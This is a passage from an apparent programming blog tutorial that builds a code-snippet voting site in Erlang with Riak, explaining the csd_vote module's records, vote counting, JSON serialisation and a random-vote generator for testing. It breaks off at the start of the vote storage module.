</span><span class='line'>X-Riak-Vclock: a85hYGBgzGDKBVIcMRuuc/nPTpqdwZTImMfK8Our00m+LAA<span class="o">=</span>
</span><span class='line'>x-riak-index-userid_int: 12345
</span><span class='line'>Vary: Accept-Encoding
</span><span class='line'>Server: MochiWeb/1.1 WebMachine/1.9.0 <span class="o">(</span>someone had painted it blue<span class="o">)</span>
</span><span class='line'>Link: &lt;/riak/snippet&gt;; <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;up&quot;</span>
</span><span class='line'>Last-Modified: Tue, 05 Jun 2012 21:28:26 GMT
</span><span class='line'>ETag: <span class="s2">&quot;5E5aOqpuUZa30DpSVytdn7&quot;</span>
</span><span class='line'>Date: Tue, 05 Jun 2012 21:37:09 GMT
</span><span class='line'>Content-Type: application/json
</span><span class='line'>Content-Length: 117
</span><span class='line'>
</span><span class='line'><span class="o">{</span><span class="s2">&quot;key&quot;</span>:<span class="s2">&quot;AIUWiw==&quot;</span>,<span class="s2">&quot;title&quot;</span>:<span class="s2">&quot;The Basics&quot;</span>,<span class="s2">&quot;left&quot;</span>:<span class="s2">&quot;var x = 1;&quot;</span>,<span class="s2">&quot;right&quot;</span>:<span class="s2">&quot;int x = 1;&quot;</span>,<span class="s2">&quot;created&quot;</span>:<span class="s2">&quot;2012-06-05T21:28:20.314Z&quot;</span><span class="o">}</span>%
</span></code></pre></td></tr></table></div></figure>


<p>You can see that the detail we&rsquo;re getting matches that which we pulled straight out of our application, including the <code>X-riak-index-userid_int</code> header which contains the Id of the user the submitted the snippet.</p>

<p>Everything looks in order. Next let&rsquo;s handle storage of votes.</p>

<h2><a id="storing-votes"></a>Storing Votes</h2>

<p>Storage of a snippet is a great thing, but it is ultimatley meaningless of people can&rsquo;t indicate which one they prefer. What we need to be able to do is provide the ability to vote so that users of the site can see which side of the snippet users feel is the best.</p>

<p>We&rsquo;ve already discussed the approach that we&rsquo;re going to take. Let&rsquo;s dive into the code.</p>

<h3><a id="csd_vote"></a><code>csd_vote</code> module</h3>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_vote</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span>
</span><span class='line'>    <span class="n">to_vote</span><span class="o">/</span><span class="mi">3</span><span class="p">,</span>
</span><span class='line'>    <span class="n">fetch</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">save</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_user_id</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_which</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_id</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_id</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">to_json</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">from_json</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">get_snippet_id</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">count_for_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">count_for_snippet</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">random_votes</span><span class="o">/</span><span class="mi">2</span>
</span><span class='line'>  <span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Internal Record Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">vote</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">user_id</span><span class="p">,</span>
</span><span class='line'>    <span class="n">snippet_id</span><span class="p">,</span>
</span><span class='line'>    <span class="n">which</span><span class="p">,</span>
</span><span class='line'>    <span class="n">time</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">count</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">left</span><span class="p">,</span>
</span><span class='line'>    <span class="n">right</span><span class="p">,</span>
</span><span class='line'>    <span class="n">which</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that we&rsquo;re following a similar pattern to what we did with snippets. We have an internal <code>vote</code> record which indicates which user submitted the vote, which snippet the vote is for, which side of the snippet they voted for (<code>"left"</code> or <code>"right"</code>) and a timestamp. Hopefully there&rsquo;s nothing in here that will surprise anyone.</p>

<p>The next record, <code>count</code>, is a little more interesting. It will make more sense after we see where it is used, but in short the purpose of this record is to group the results of a map/reduce job which counts the number of votes for a given snippet and which side the votes were for. If the search is conducted by a known (ie. logged-in user) the record will also indicate which side of the snippet they voted for (if any).</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_vote</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="o">=</span><span class="s">&quot;left&quot;</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">to_vote_inner</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="p">);</span>
</span><span class='line'><span class="nf">to_vote</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="o">=</span><span class="s">&quot;right&quot;</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">to_vote_inner</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>to_vote</code> is a simple function that is used to create an instance of a vote. The interface of this function is designed to stop callers from submitting vote for anything other than <code>"left"</code> or <code>"right"</code>, as this wouldn&rsquo;t make sense to the system. This function calls an internal version which is defined a bit later on.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">L</span><span class="p">,</span> <span class="nv">R</span><span class="p">}}</span> <span class="o">=</span> <span class="nn">csd_db</span><span class="p">:</span><span class="n">vote_count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nl">#count</span><span class="p">{</span>
</span><span class='line'>    <span class="n">left</span> <span class="o">=</span> <span class="nv">L</span><span class="p">,</span>
</span><span class='line'>    <span class="n">right</span> <span class="o">=</span> <span class="nv">R</span><span class="p">,</span>
</span><span class='line'>    <span class="n">which</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="p">}}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">L</span><span class="p">,</span> <span class="nv">R</span><span class="p">,</span> <span class="nv">W</span><span class="p">}}</span> <span class="o">=</span> <span class="nn">csd_db</span><span class="p">:</span><span class="n">vote_count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nl">#count</span><span class="p">{</span>
</span><span class='line'>    <span class="n">left</span> <span class="o">=</span> <span class="nv">L</span><span class="p">,</span>
</span><span class='line'>    <span class="n">right</span> <span class="o">=</span> <span class="nv">R</span><span class="p">,</span>
</span><span class='line'>    <span class="n">which</span> <span class="o">=</span> <span class="nv">W</span>
</span><span class='line'>  <span class="p">}}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>These two functions are the magic that makes the vote counting tick. They both essentially do the same thing but for one small difference. The first, <code>count_for_snippet/1</code> takes a single parameter which is the Id of the snippet. It make a call to the <code>csd_db</code> module to kick off a map/reduce job in Riak. The result is a pair of values, <code>{L, R}</code>, where <code>L</code> is the total number of votes for the left side of the snippet and <code>R</code> is the total number for the right side. This search is done outside of the context of a known user. The result of a call to this function is a record which doesn&rsquo;t have a meaningful value for the <code>which</code> record member.</p>

<p>The second function, <code>count_for_snippet/2</code>, is the same as the first except that it also takes the identifier of the user that is conducting the search. This version of the function also calls a counterpart in <code>csd_db</code>, but the result is different in that it also contains the side of the snippet which that particular user voted for. This <code>which</code> value will be either <code>"left"</code>, <code>"right"</code> or <code>""</code>. If it&rsquo;s <code>""</code> then that indicates that the user hasn&rsquo;t voted on this snippet.</p>

<p>Next up we have the standard serialisation functions.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nl">#vote</span><span class="p">{</span><span class="n">time</span><span class="o">=</span><span class="nv">T</span><span class="p">,</span> <span class="n">which</span><span class="o">=</span><span class="nv">W</span><span class="p">,</span> <span class="n">snippet_id</span><span class="o">=</span><span class="nv">S</span><span class="p">,</span> <span class="n">user_id</span><span class="o">=</span><span class="nv">U</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_json</span><span class="p">:</span><span class="n">to_json</span><span class="p">([</span>
</span><span class='line'>      <span class="p">{</span><span class="n">time</span><span class="p">,</span> <span class="nv">T</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">user_id</span><span class="p">,</span> <span class="nv">U</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">snippet_id</span><span class="p">,</span> <span class="nv">S</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">which</span><span class="p">,</span> <span class="nv">W</span><span class="p">}],</span>
</span><span class='line'>    <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nl">#count</span><span class="p">{</span><span class="n">left</span><span class="o">=</span><span class="nv">L</span><span class="p">,</span> <span class="n">right</span><span class="o">=</span><span class="nv">R</span><span class="p">,</span> <span class="n">which</span><span class="o">=</span><span class="nv">W</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_json</span><span class="p">:</span><span class="n">to_json</span><span class="p">([</span>
</span><span class='line'>      <span class="p">{</span><span class="n">left</span><span class="p">,</span> <span class="nv">L</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">right</span><span class="p">,</span> <span class="nv">R</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">which</span><span class="p">,</span> <span class="nv">W</span><span class="p">}],</span>
</span><span class='line'>    <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>By now these functions should be self-explanatory, so we&rsquo;ll kick on to something more interesting.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">get_vote</span><span class="p">(</span><span class="n">get_id</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">)).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">Vote</span><span class="o">=</span><span class="nl">#vote</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">save_vote</span><span class="p">(</span><span class="nv">Vote</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_user_id</span><span class="p">(</span><span class="nl">#vote</span><span class="p">{</span><span class="n">user_id</span><span class="o">=</span><span class="nv">U</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">U</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_which</span><span class="p">(</span><span class="nl">#vote</span><span class="p">{</span><span class="n">which</span><span class="o">=</span><span class="nv">W</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">W</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_snippet_id</span><span class="p">(</span><span class="nl">#vote</span><span class="p">{</span><span class="n">snippet_id</span><span class="o">=</span><span class="nv">S</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">S</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_id</span><span class="p">(</span><span class="nl">#vote</span><span class="p">{</span><span class="n">user_id</span><span class="o">=</span><span class="nv">U</span><span class="p">,</span> <span class="n">snippet_id</span><span class="o">=</span><span class="nv">S</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">get_id</span><span class="p">(</span><span class="nv">U</span><span class="p">,</span> <span class="nv">S</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_id</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nb">iolist_to_binary</span><span class="p">([</span><span class="nb">integer_to_list</span><span class="p">(</span><span class="nv">UserId</span><span class="p">),</span> <span class="s">&quot;-&quot;</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The functions are also rather rudimentary and fit the usual pattern that we&rsquo;re applying across our application. The one thing to note here is that a vote doesn&rsquo;t have its own identifer that is generated. Instead, the key that is used to identify a vote in the <code>vote</code> bucket is a combination of the user&rsquo;s Id and the snippet&rsquo;s Id.</p>

<p>At this point the requirement for the accessor functions won&rsquo;t be clear. Keep them in mind, we&rsquo;ll cover them off a bit later when we look at the code that&rsquo;s closer to the UI.</p>

<p>Next up here&rsquo;s a typical deserialisation function.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">from_json</span><span class="p">(</span><span class="nv">Json</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">List</span> <span class="o">=</span> <span class="nn">csd_json</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">Json</span><span class="p">,</span> <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">),</span>
</span><span class='line'>  <span class="nl">#vote</span><span class="p">{</span>
</span><span class='line'>    <span class="n">time</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">time</span><span class="p">,</span> <span class="nv">List</span><span class="p">),</span>
</span><span class='line'>    <span class="n">user_id</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="nv">List</span><span class="p">),</span>
</span><span class='line'>    <span class="n">snippet_id</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">snippet_id</span><span class="p">,</span> <span class="nv">List</span><span class="p">),</span>
</span><span class='line'>    <span class="n">which</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">which</span><span class="p">,</span> <span class="nv">List</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nothing too stellar here either. After converting the JSON back into a proplist, we&rsquo;re just poking the the values into our <code>vote</code> record.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">random_votes</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">NumVotes</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">random</span><span class="p">:</span><span class="n">seed</span><span class="p">(</span><span class="nn">erlang</span><span class="p">:</span><span class="n">now</span><span class="p">()),</span>
</span><span class='line'>  <span class="nn">lists</span><span class="p">:</span><span class="n">map</span><span class="p">(</span><span class="k">fun</span><span class="p">(_)</span> <span class="o">-&gt;</span>
</span><span class='line'>        <span class="nv">Which</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">random</span><span class="p">:</span><span class="n">uniform</span><span class="p">(</span><span class="mi">99999999</span><span class="p">)</span> <span class="ow">rem</span> <span class="mi">2</span> <span class="k">of</span>
</span><span class='line'>          <span class="mi">0</span> <span class="o">-&gt;</span> <span class="s">&quot;left&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="p">_</span> <span class="o">-&gt;</span> <span class="s">&quot;right&quot;</span>
</span><span class='line'>        <span class="k">end</span><span class="p">,</span>
</span><span class='line'>        <span class="nv">V</span> <span class="o">=</span> <span class="n">to_vote</span><span class="p">(</span><span class="nn">random</span><span class="p">:</span><span class="n">uniform</span><span class="p">(</span><span class="mi">99999999</span><span class="p">),</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="p">),</span>
</span><span class='line'>        <span class="n">save</span><span class="p">(</span><span class="nv">V</span><span class="p">)</span> <span class="k">end</span><span class="p">,</span> <span class="nn">lists</span><span class="p">:</span><span class="n">seq</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">NumVotes</span><span class="p">)),</span>
</span><span class='line'>  <span class="n">ok</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>random_votes</code> function is something that I decided to put in to simulate larger numbers of votes. Given that the system isn&rsquo;t live, I wanted to be able to generate votes for a given snippet so that I could see the affect on the UI. Leaving this function in makes sense for the benefit of my awesome reader(s) so they can see the effect themselves. Ultimately it doesn&rsquo;t belong in the <em>production</em> version.</p>

<p>Now for the last two functions in the module.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_vote_inner</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">Which</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nl">#vote</span><span class="p">{</span>
</span><span class='line'>    <span class="n">user_id</span> <span class="o">=</span> <span class="nv">UserId</span><span class="p">,</span>
</span><span class='line'>    <span class="n">snippet_id</span> <span class="o">=</span> <span class="nv">SnippetId</span><span class="p">,</span>
</span><span class='line'>    <span class="n">time</span> <span class="o">=</span> <span class="nn">csd_date</span><span class="p">:</span><span class="n">utc_now</span><span class="p">(),</span>
</span><span class='line'>    <span class="n">which</span> <span class="o">=</span> <span class="nv">Which</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">time</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">which</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">snippet_id</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(_)</span> <span class="o">-&gt;</span> <span class="n">false</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>to_vote_inner</code> is a simple function called by <code>to_vote</code> at the top of the module. It&rsquo;s there just to reduce code duplication. <code>is_string</code> is the classic helper function which tells the JSON serialiser/deserialiser which values are strings and which aren&rsquo;t.</p>

<p>We&rsquo;re done with the handling module, next we need to dive into how these are stored.</p>

<h3><a id="csd_vote_store"></a><code>csd_vote_store</code> module</h3>

<p>This module follows the same pattern as the snippet storage module. Let&rsquo;s take a look at the code, starting with the defines. This is where we start to get into more interesting map/reduce jobs.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_vote_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_vote_store</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">BUCKET</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;vote&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
